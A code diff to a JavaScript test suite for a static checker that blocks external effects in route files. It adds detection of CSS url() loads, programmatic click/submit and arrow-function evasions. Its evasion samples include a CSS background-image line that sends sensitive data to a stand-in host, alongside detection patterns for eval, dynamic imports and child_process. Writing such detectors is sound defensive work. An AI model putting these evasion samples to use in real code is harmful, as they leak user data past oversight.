@@ -349,6 +349,51 @@ function maskJsxTextNodes(source) {
       return false;
     }
 
+    let genericEnd = index + 1;
+    let genericDepth = 1;
+    while (genericEnd < source.length && genericEnd - index <= 500) {
+      if (source[genericEnd] === "<") {
+        genericDepth += 1;
+      } else if (source[genericEnd] === ">") {
+        genericDepth -= 1;
+        if (genericDepth === 0) {
+          break;
+        }
+      }
+      genericEnd += 1;
+    }
+
+    if (genericDepth === 0) {
+      let parametersStart = genericEnd + 1;
+      while (/\s/.test(source[parametersStart] ?? "")) {
+        parametersStart += 1;
+      }
+
+      if (source[parametersStart] === "(") {
+        let parametersEnd = parametersStart + 1;
+        let parameterDepth = 1;
+        while (parametersEnd < source.length && parameterDepth > 0) {
+          if (source[parametersEnd] === "(") {
+            parameterDepth += 1;
+          } else if (source[parametersEnd] === ")") {
+            parameterDepth -= 1;
+          }
+          parametersEnd += 1;
+        }
+
+        while (/\s/.test(source[parametersEnd] ?? "")) {
+          parametersEnd += 1;
+        }
+        const afterParameters = source.slice(parametersEnd, parametersEnd + 500);
+        if (
+          afterParameters.startsWith("=>") ||
+          /^:\s*[^;=]+=>/.test(afterParameters)
+        ) {
+          return false;
+        }
+      }
+    }
+
     const previous = previousCodeToken(index);
     if (previous < 0 || /[=(:,[!&|?{};]/.test(source[previous])) {
       return true;
@@ -514,6 +559,32 @@ function loadsExternalJsxResource(source) {
   return false;
 }
 
+function loadsExternalCssResource(source) {
+  const analyzed = getSourceAnalysis(source);
+  const cssProperty =
+    /\b(?:background|backgroundImage|borderImage|borderImageSource|content|cursor|listStyle|listStyleImage|mask|maskImage|src)\s*:/g;
+  const externalUrl = /\burl\s*\(\s*["'`]?(?:https?:)?\/\//i;
+
+  for (const match of analyzed.executable.matchAll(cssProperty)) {
+    if (externalUrl.test(analyzed.active.slice(match.index, match.index + 1000))) {
+      return true;
+    }
+  }
+
+  for (const match of analyzed.executable.matchAll(/<style\b/gi)) {
+    const styleEnd = analyzed.executable.indexOf("</style>", match.index);
+    const candidate = analyzed.active.slice(
+      match.index,
+      styleEnd === -1 ? undefined : styleEnd + "</style>".length,
+    );
+    if (externalUrl.test(candidate)) {
+      return true;
+    }
+  }
+
+  return false;
+}
+
 function fail(route, contract) {
   assert.fail(`${route}: ${contract}`);
 }
@@ -532,6 +603,7 @@ function assertNoExternalEffects(route, files) {
     ["executable", /\b(?:eval|Function|constructor)\b/, "não pode executar código dinâmico"],
     ["executable", /\\(?:u(?:[0-9a-fA-F]{4}|\{[0-9a-fA-F]+\})|x[0-9a-fA-F]{2})/, "não pode usar escape Unicode ou hexadecimal em código executável"],
     ["executable", /\b(?:fromCharCode|fromCodePoint|atob|btoa)\b/, "não pode reconstruir identificadores dinamicamente"],
+    ["executable", /\b(?:click|submit)\b/, "não pode simular clique ou submissão programática"],
     ["executable", /\bimport\s*\(/, "não pode usar importação dinâmica"],
     ["executable", /\brequire\s*\(/, "não pode usar carregamento dinâmico"],
   ];
@@ -573,6 +645,10 @@ function assertNoExternalEffects(route, files) {
 
     if (loadsExternalJsxResource(source)) {
       fail(route, `${name} não pode carregar recurso externo por JSX`);
+    }
+
+    if (loadsExternalCssResource(source)) {
+      fail(route, `${name} não pode carregar recurso externo por CSS`);
     }
   }
 }
@@ -775,6 +851,13 @@ test("descoberta é determinística, recursiva e aceita árvore vazia", async (t
       "import { exec } from 'child_process';",
       "import { fetcher } from '@/lib/fetcher';",
       "export { fetcher } from '../../lib/fetcher';",
+      "const identity = <T>(arg: T) => fetch('/api');",
+      "const identity = <T,>(arg: T) => fetch('/api');",
+      "const identity = <T extends Record<string, unknown>>(arg: T): Promise<T> => fetch('/api');",
+      "const style = { backgroundImage: `url('https://example.invalid/coleta?data=${sensitiveData}')` };",
+      "ref.current?.click();",
+      "formRef.current?.submit();",
+      "const { click } = ref.current; click();",
     ];
 
     for (const [index, source] of evasions.entries()) {
@@ -809,6 +892,9 @@ test("descoberta é determinística, recursiva e aceita árvore vazia", async (t
       "import { LocalPlannerShell } from '@/components';",
       "const f = () => {}; /fetch/.test(copy);",
       '<button alt=">" aria-label={label} data-kind={kind}>Abrir</button>',
+      '<button onClick={handleClick} onSubmit={handleSubmit}>Continuar</button>',
+      "const localStyle = { backgroundImage: \"url('/marca.svg')\" };",
+      "const cssDocumentation = \"Exemplo textual: backgroundImage: url('https://example.invalid')\";",
       "<p>Este planejador não usa fetch, location ou document.</p>",
       "<div>https://example.invalid/fetch</div>",
     ];
